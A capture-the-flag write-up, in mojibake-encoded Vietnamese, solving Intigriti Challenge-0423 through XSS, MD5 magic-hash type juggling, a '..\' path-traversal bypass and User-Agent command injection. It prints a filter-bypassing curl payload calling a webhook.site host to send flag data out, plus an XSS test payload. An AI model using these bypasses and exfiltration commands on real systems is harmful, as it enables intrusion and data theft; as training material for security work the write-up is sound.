# [Intigriti] Challenge-0423
<p>Äáº§u tiÃªn, táº¡i /challenge.php nháº­n vá» má»™t giao diá»‡n trang login. Äá» bÃ i Ä‘Ã£ cho sáºµn username=strange vÃ  password=monkey Ä‘á»ƒ login. Sau khi login, server tráº£ vá» 2 cookie lÃ  username vÃ  account_type rá»“i chuyá»ƒn hÆ°á»›ng vá» /dashboard.php.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image.png)

<p>Thay Ä‘á»•i cookie username vÃ  account_type báº±ng cÃ¡ch giÃ¡ trá»‹ khÃ¡c nhau nhÆ°ng khÃ´ng cÃ³ dáº¥u hiá»‡u gÃ¬ Ä‘áº·c biá»‡t á»Ÿ response.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-1.png)

<p>Kiá»ƒm tra cÃ¡c thÆ° má»¥c cÃ³ listing hay khÃ´ng? Káº¿t quáº£ lÃ  khÃ´ng Ä‘Æ°á»£c phÃ©p truy cáº­p vÃ  qua viá»‡c nÃ y thÃ¬ phÃ¡t hiá»‡n ra Ä‘Æ°á»£c thÃ´ng tin web server lÃ  nginx/1.24.0. BÃ¢y giá», cÃ³ 2 hÆ°á»›ng Ä‘á»ƒ Ä‘i tiáº¿p lÃ  thá»­ cÃ¡c payload SQL injection á»Ÿ chá»©c nÄƒng login hoáº·c lÃ  tÃ¬m cÃ¡c lá»—i náº±m trÃªn nginx/1.24.0. Táº¡m thá»i Æ°u tiÃªn test chá»©c nÄƒng login trÆ°á»›c.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-2.png)

<p>Sá»­ dá»¥ng kÃ­ tá»± ' thÃ¬ server tráº£ vá» response yÃªu cáº§u Ä‘iá»u hÆ°á»›ng tá»›i /index_error.php?error=invalid username or password.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-3.png)

<p>Sau Ä‘Ã³, nháº­n Ä‘Æ°á»£c response cÃ³ má»™t dÃ²ng comment "Nhá»› sá»­ dá»¥ng strict comparison" -> CÃ³ váº» nhÆ° Ä‘Ã¢y lÃ  gá»£i Ã½ trang web bá»‹ lá»—i type juggling. CÃ¡c vá»‹ trÃ­ cÃ³ kháº£ nÄƒng bá»‹ type juggling cÃ³ thá»ƒ xáº£y ra lÃ  login, cookie. Äiá»u Ä‘Ã¡ng chÃº Ã½ lÃ  giÃ¡ trá»‹ cá»§a tham sá»‘ error cÃ³ váº» nhÆ° Ä‘Æ°á»£c render trá»±c tiáº¿p ra HTML response -> CÃ³ kháº£ nÄƒng bá»‹ XSS.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-4.png)

<p>Thá»­ &lth1&gta thÃ¬ xÃ¡c Ä‘á»‹nh HTML injection thÃ nh cÃ´ng.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-5.png)

<p>Thá»­ &ltscript&gtalert(origin)&lt/script&gt thÃ¬ xÃ¡c Ä‘á»‹nh Ä‘Ãºng trang web nÃ y Ä‘Ã£ bá»‹ XSS.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-6.png)

<p>Quay vá» trang login, mÃ¬nh cÃ³ tháº¯c máº¯c lÃ  server cÃ³ nháº­n dá»¯ liá»‡u dÆ°á»›i dáº¡ng nÃ o khÃ¡c ngoÃ i form khÃ´ng ? (vÃ­ dá»¥ nhÆ° lÃ  json, xml,...). Sau khi Ä‘á»•i Ä‘á»‹nh dáº¡ng lÃ  json vÃ  gá»­i Ä‘i thÃ¬ phÃ¡t hiá»‡n ra cÃ³ váº» nhÆ° trang nÃ y chÆ°a táº¯t cáº¥u hÃ¬nh display_errors dáº«n Ä‘áº¿n hiá»ƒn thá»‹ waring á»Ÿ phÃ­a client. Dá»±a vÃ o warning thÃ¬ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c 2 Ä‘iá»u: khÃ´ng nháº­n dá»¯ liá»‡u json khi login vÃ  Ä‘Æ°á»ng dáº«n tá»›i trang login lÃ  /app/login.php. VÃ¬ khÃ´ng nháº­n dá»¯ liá»‡u json nÃªn giáº£ thuyáº¿t sá»­ dá»¥ng "psw": true lÃ  coi nhÆ° loáº¡i -> Kháº£ nÄƒng bá»‹ type juggling cÃ²n láº¡i lÃ  náº±m trong cookie.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-7.png)

<p>GiÃ¡ trá»‹ cá»§a cookie account_type khÃ¡ Ä‘áº·c biá»‡t, lÃ  má»™t chuá»—i khÃ´ng rÃµ cÃ³ Ã½ nghÄ©a gÃ¬ vÃ  khi thay Ä‘á»•i thÃ¬ response cÅ©ng khÃ´ng cÃ³ dáº¥u hiá»‡u gÃ¬ Ä‘áº·c biá»‡t. Dá»±a vÃ o tÃªn "account_type" thÃ¬ mÃ¬nh Ä‘oÃ¡n cÃ³ thá»ƒ giÃ¡ trá»‹ lÃ  má»™t mÃ£ Ä‘á»ƒ phÃ¢n biá»‡t cÃ¡c loáº¡i tÃ i khoáº£n (VIP, Normal,...). CÃ³ thá»ƒ lÃ  cÃ¡c giÃ¡ trá»‹ sáº½ Ä‘Æ°á»£c hash, encrypt,... Ä‘á»ƒ so sÃ¡nh vá»›i giÃ¡ trá»‹ nÃ o Ä‘Ã³ á»Ÿ phÃ­a server. LiÃªn quan Ä‘áº¿n hash thÃ¬ trong type juggling cÃ³ cÃ¡c chuá»—i Ä‘Æ°á»£c gá»i lÃ  magic hash. Ã tÆ°á»Ÿng bÃ¢y giá» lÃ  thá»­ cÃ¡c hash phá»• biáº¿n nhÆ° MD5, SHA1,.. TÃ¬m chuá»—i sau khi hash MD5 cÃ³ dáº¡ng 0e... -> Chá»n "etqaTTFXeujI" vÃ  response tráº£ vá» cÃ³ má»™t element khÃ¡ Ä‘áº·c biá»‡t. Dá»±a vÃ o tiÃªu Ä‘á» &lt;h3 id=&quot;custom_image.php - try to catch the flag.txt ;)&quot;&gt;A special golden wall just for Premium Users ;) &lt;/h3&gt; cÃ³ thá»ƒ Ä‘oÃ¡n ráº±ng truy cáº­p Ä‘áº¿n /custom_image.php Ä‘á»ƒ tÃ¬m flag.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-8.png)

<p>Táº¡i /custom_image.php, browser render ra má»™t image lÃ  má»™t bá»©c tÆ°á»ng mÃ u vÃ ng. Dá»±a vÃ o tÃªn file thÃ¬ kháº£ nÄƒng cao lÃ  endpoint nÃ y xá»­ lÃ½ gÃ¬ Ä‘Ã³ rá»“i má»›i tráº£ vá» ná»™i dung táº¥m áº£nh chá»© sá»­ dá»¥ng file .php chá»‰ tráº£ vá» ná»™i dung áº£nh thÃ¬ khÃ´ng há»£p lÃ­ cho láº¯m. Táº¡i vÃ¬, háº§u háº¿t nhá»¯ng áº£nh trÃªn trang web nÃ y Ä‘á»u Ä‘Æ°á»£c lÆ°u táº­p trung trong cÃ¡c thÆ° má»¥c cá»¥ thá»ƒ nhÆ° lÃ  resources hoáº·c images. BÃ¢y giá», cÃ³ 2 hÆ°á»›ng Ä‘á»ƒ tiáº¿p tá»¥c lÃ  fuzz cÃ¡c parameter táº¡i /custom_image.php hoáº·c lÃ  Ä‘i tÃ¬m bÃ­ máº­t nÃ o Ä‘Ã³ Ä‘Æ°á»£c giáº¥u trong áº£nh nÃ y</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-9.png)

<p>Sá»­ dá»¥ng má»™t sá»‘ tools: exiftool, steghide,... thÃ¬ káº¿t quáº£ cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘Ã¡ng chÃº Ã½ -> HÆ°á»›ng nÃ y cÃ³ váº» fail</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-10.png)

<p>Quay láº¡i hÆ°á»›ng thá»© nháº¥t, sá»­ dá»¥ng ffuf Ä‘á»ƒ fuzz parameter. VÃ¬ trong láº§n fuzz Ä‘áº§u tiÃªn cÃ³ khÃ¡ nhiá»u káº¿t quáº£ cÃ³ cÃ¹ng kÃ­ch thÆ°á»›c nÃªn táº¡m thá»i filter cÃ¡c response cÃ³ cÃ¹ng size -> Káº¿t quáº£ tÃ¬m Ä‘Æ°á»£c má»™t parameter lÃ  file.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-11.png)

<p>ChÆ°a rÃµ lÃ  tham sá»‘ file nÃ y yÃªu cáº§u giÃ¡ trá»‹ lÃ  gÃ¬. CÃ³ thá»ƒ lÃ  Ä‘Æ°á»ng dáº«n tÆ°Æ¡ng Ä‘á»‘i hoáº·c tuyá»‡t Ä‘á»‘i. Tuy nhiÃªn, vÃ¬ Ä‘Ã£ biáº¿t lÃ  trang nÃ y sáº½ hiá»ƒn thá»‹ cÃ¡c warning vÃ  error nÃªn mÃ¬nh sáº½ cá»‘ gáº¯ng thá»­ cÃ¡c trÆ°á»ng há»£p gÃ¢y ra error/warning Ä‘á»ƒ leak thÃªm thÃ´ng tin. Thá»­ truyá»n tham sá»‘ vá»›i kiá»ƒu array thÃ¬ gÃ¢y ra lá»—i thÃ nh cÃ´ng. Dá»±a vÃ o stack trace: lá»—i báº¯t Ä‘áº§u tá»« dÃ²ng code thá»© 12 khi sá»­ dá»¥ng strpos(Array, "../") -> mÃ¬nh Ä‘oÃ¡n tham sá»‘ Ä‘áº§u tiÃªn cá»§a hÃ m strpos lÃ  biáº¿n nháº­n giÃ¡ trá»‹ cá»§a tham sá»‘ file vÃ¬ tÃ´i Ä‘Ã£ truyá»n vÃ o má»™t máº£ng nÃªn bá»‹ lá»—i lÃ  Ä‘Ãºng vÃ  tham sá»‘ thá»© hai lÃ  "../" -> CÃ³ váº» nhÆ° dÃ²ng code nÃ y dÃ¹ng Ä‘á»ƒ kiá»ƒm tra chuá»—i "../" gÃ¢y path traversal trong giÃ¡ trá»‹ cá»§a tham sá»‘ file.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-12.png)

<p>Sá»­ dá»¥ng má»™t Ä‘Æ°á»ng dáº«n tuyá»‡t Ä‘á»‘i cÃ³ sáºµn trÃªn web Ä‘á»ƒ test. Káº¿t quáº£ lÃ  hiá»ƒn thá»‹ má»™t thÃ´ng bÃ¡o lá»—i leak ra file_get_content vÃ  Ä‘á»c ná»™i dung tá»« Ä‘Æ°á»ng dáº«n láº¥y tá»« tham sá»‘ file.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-13.png)

<p>Thá»­ thÃªm chuá»—i "../" thÃ¬ bá»‹ replace Ä‘i -> CÃ³ váº» nhÆ° strpos á»Ÿ dÃ²ng 12 sáº½ tÃ¬m chuá»—i "../" vÃ  sau Ä‘Ã³ thá»±c hiá»‡n replace rá»“i má»›i Ä‘Æ°a vÃ o hÃ m file_get_content. ChÆ°a rÃµ lÃ  viá»‡c replace nÃ y cÃ³ láº·p láº¡i nhiá»u láº§n hay khÃ´ng nÃªn cáº§n pháº£i test thÃªm.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-14.png)

<p>ChÃ¨n thÃªm cÃ¡c chuá»—i "../" vÃ o giá»¯a thÃ¬ táº¥t cáº£ Ä‘á»u Ä‘Ã£ bá»‹ replace -> HÆ°á»›ng sá»­ dá»¥ng "../" cÃ³ váº» fail. Tuy nhiÃªn, náº¿u server sá»­ dá»¥ng há»‡ Ä‘iá»u hÃ nh Windows thÃ¬ váº«n cÃ²n má»™t cÃ¡ch khÃ¡c. ÄÃ³ lÃ  sá»­ dá»¥ng kÃ­ tá»± \ thay vÃ¬ /.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-15.png)

<p>Váº­y lÃ  thÃ nh cÃ´ng bypass viá»‡c kiá»ƒm tra "../" báº±ng cÃ¡ch sá»­ dá»¥ng "..\"</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-16.png)

<p>Tuy nhiÃªn, sá»­ dá»¥ng bao nhiÃªu "..\" cÅ©ng khÃ´ng tÃ¬m tháº¥y flag.txt -> CÃ³ váº» nhÆ° thÆ° má»¥c www náº±m trong thÆ° má»¥c chá»©a mÃ£ nguá»“n cá»§a trang web chá»© khÃ´ng pháº£i náº±m trong thÆ° má»¥c gá»‘c</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-17.png)

<p>Thay tháº¿ báº±ng www/web/images/ vÃ  thá»­ láº¡i -> ThÃ nh cÃ´ng</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-18.png)

<p>Chuyá»ƒn Ä‘á»•i kiá»ƒu dá»¯ liá»‡u thÃ nh text/plain Ä‘á»ƒ xem ná»™i dung gá»‘c. CÃ³ váº» ná»™i dung gá»£i Ã½ truy cáº­p Ä‘áº¿n /e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-19.png)

<p>TÆ°Æ¡ng tá»±, ra Ä‘Æ°á»£c ná»™i dung admin.php. CÃ³ má»™t dÃ²ng code sá»­ dung shell_exec nháº­n giÃ¡ trá»‹ tá»« trÆ°á»ng User-Agent trÃªn HTTP Header -> Kháº£ nÄƒng bá»‹ OS Command injection. NhÃ¬n chung thÃ¬ viá»‡c sá»­ dá»¥ng blacklist vÃ  sau Ä‘Ã³ replace trong trÆ°á»ng nÃ y váº«n bypass Ä‘Æ°á»£c. Thá»© nháº¥t, blacklist váº«n thiáº¿u  cÃ¡c kÃ­ tá»± nhÆ°: ` $ ( ) . Thá»© hai, viá»‡c replace cÃ¡c chuá»—i khá»›p vá»›i pháº§n trong blacklist thÃ¬ há»£p lÃ­ vá»›i cÃ¡c kÃ½ tá»± láº» cÃ²n vá»›i tá»« 2 kÃ­ tá»± khÃ¡c nhau trá»Ÿ lÃªn thÃ¬ hoÃ n toÃ n cÃ³ thá»ƒ chÃ¨n thÃªm chuá»—i á»Ÿ giá»¯a Ä‘á»ƒ bypass.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-20.png)

<p>Äáº§u tiÃªn, sá»­ dá»¥ng payload: `cucurlrl${IFS}https://webhook.site/7d182ba8-11b7-405f-bcdd-ad2ad82e6254` Ä‘á»ƒ xem thá»±c sá»± cÃ³ tá»“n táº¡i lá»‡nh curl vÃ  server cÃ³ Ä‘Æ°á»£c phÃ©p káº¿t ná»‘i ra ngoÃ i internet hay khÃ´ng. CÃ³ request gá»­i tá»›i webhook -> Curl thÃ nh cÃ´ng. Tiáº¿p theo, Ä‘á»ƒ leak data ra ngoÃ i báº±ng lá»‡nh curl thÃ¬ cÃ³ thá»ƒ truyá»n qua tham sá»‘ hoáº·c dÃ¹ng data-binary . Tuy nhiÃªn, cÃ¡ch sá»­ dá»¥ng data-binary cÃ³ váº» khÃ´ng kháº£ thi.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-21.png)

<p>Ban Ä‘áº§u, khi sá»­ dá»¥ng cat Ä‘á»ƒ Ä‘á»c ná»™i dung flag.txt thÃ¬ ná»™i dung tráº£ vá» lÃ  rá»—ng. CÃ³ váº» nhÆ° tÃªn file chá»©a flag khÃ´ng pháº£i lÃ  flag.txt nÃªn thay vÃ o Ä‘Ã³ mÃ¬nh sá»­ dá»¥ng kÃ­ tá»± * Ä‘á»ƒ Ä‘á»c file .txt. -> Láº¥y Ä‘Æ°á»£c flag thÃ nh cÃ´ng.</p>

![alt text](/thanhlai/post/web_exploitation/image/post1/image-22.png)

<p>TÃ³m láº¡i, Ä‘Ã¢y lÃ  toÃ n bá»™ ná»™i dung vá» challenge. Hy vá»ng writeup nÃ y giÃºp Ã­ch cho báº¡n ğŸ”¥.</p>
